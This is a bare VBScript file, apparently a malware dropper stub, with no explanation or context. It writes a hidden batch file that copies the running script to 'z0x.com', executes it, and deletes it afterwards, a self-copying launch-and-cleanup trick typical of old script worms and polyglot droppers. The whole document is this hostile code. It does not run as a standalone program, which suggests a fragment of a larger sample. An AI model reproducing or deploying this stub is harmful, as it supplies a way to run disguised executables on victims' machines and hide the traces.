Dim a,f,s
Set a = Wscript.CreateObject("Wscript.Shell")
Set f = CreateObject("Scripting.FileSystemObject")
Set s = f.CreateTextFile("z0x.bat", 2, False)
s.WriteLine "echo off"
s.WriteLine "copy " & Wscript.ScriptFullName & " z0x.com>NUL"
s.WriteLine "z0x.com"
s.WriteLine "del z0x.com"
s.Close
a.Run ("z0x.bat")